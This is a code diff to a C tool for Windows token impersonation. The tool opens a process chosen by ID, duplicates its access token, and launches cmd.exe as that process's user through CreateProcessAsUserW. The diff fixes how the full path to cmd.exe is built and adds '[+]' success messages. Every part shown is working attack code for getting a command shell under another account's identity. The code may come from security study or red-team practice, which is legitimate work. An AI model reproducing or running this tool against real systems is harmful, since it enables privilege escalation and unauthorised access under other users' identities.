@@ -19,6 +19,8 @@
 // Tell the linker to add advapi32 to the list of dependencies
 #pragma comment(lib, "Advapi32.lib")
 
+#define SYSTEM_DIRECTORY_SIZE 100
+
 /*************************
  * Function Declarations *
 *************************/
@@ -152,10 +154,11 @@ int validateCmdlineArgs(int argc, char **argv) {
 
 int main(int argc, char **argv) {
 
-    DWORD targetProcId;       // The ID of the process with the access token to impersonate
-    HANDLE hProcess = NULL;   // Handle to the process with the access token to impersonate
-    HANDLE hToken = NULL;     // Access token to impersonate
-    HANDLE hNewToken = NULL;  // Duplicated access token
+    DWORD targetProcId;         // The ID of the process with the access token to impersonate
+    HANDLE hProcess    = NULL;  // Handle to the process with the access token to impersonate
+    HANDLE hToken      = NULL;  // Access token to impersonate
+    HANDLE hNewToken   = NULL;  // Duplicated access token
+    wchar_t *pathToCmd = NULL;  // Full quoted path to cmd.exe
 
     // Validate the command line arguments
     targetProcId = (DWORD)validateCmdlineArgs(argc, argv);
@@ -191,16 +194,32 @@ int main(int argc, char **argv) {
         goto CleanupMain;
     }
 
+    // Must specify full path to cmd: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera#parameters
+    wchar_t systemDirectory[SYSTEM_DIRECTORY_SIZE];
+    if (!GetSystemDirectoryW((LPWSTR)systemDirectory, SYSTEM_DIRECTORY_SIZE)) {
+        printf("[-] Error finding the system directory. GetLastError() returned: %d\n", GetLastError());
+        goto CleanupMain;
+    }
+
+    // Add quotes to the path and add cmd.exe
+    size_t cmdQuotesAndBackslashLength = wcsnlen_s(L"\\\"cmd.exe\"", 10);
+    size_t systemDirectoryLength = wcsnlen_s(systemDirectory, SYSTEM_DIRECTORY_SIZE);
+    size_t totalPathLength = cmdQuotesAndBackslashLength + systemDirectoryLength + 1;  // Add 1 for null term
+    pathToCmd = (wchar_t *)calloc(totalPathLength, sizeof(wchar_t));
+    wcsncat_s(pathToCmd, totalPathLength, L"\"", 1);
+    wcsncat_s(pathToCmd, totalPathLength, systemDirectory, systemDirectoryLength);
+    wcsncat_s(pathToCmd, totalPathLength, L"\\cmd.exe\"", 9);
+
     PROCESS_INFORMATION processInformation;
     STARTUPINFOW startInfo;
     ZeroMemory(&startInfo, sizeof(STARTUPINFO));
     startInfo.cb = sizeof(STARTUPINFO);
-    if (!CreateProcessAsUserW(hNewToken, L"\"cmd.exe\"", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startInfo, &processInformation)) {
+    if (!CreateProcessAsUserW(hNewToken, NULL, pathToCmd, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startInfo, &processInformation)) {
         printf("[-] Error creating the process as the impersonated user. GetLastError() returned: %d\n", GetLastError());
         goto CleanupMain;
     }
 
-    printf("Successfully created process as another user\n");
+    printf("[+] Successfully created process as another user!\n\n");
 
     // Wait for child process to exit
     if (processInformation.hProcess != INVALID_HANDLE_VALUE) {
@@ -214,6 +233,7 @@ CleanupMain:
     if (hProcess)  CloseHandle(hProcess);
     if (hToken)    CloseHandle(hToken);
     if (hNewToken) CloseHandle(hNewToken);
+    if (pathToCmd) free(pathToCmd);
 
     return 0;
 }
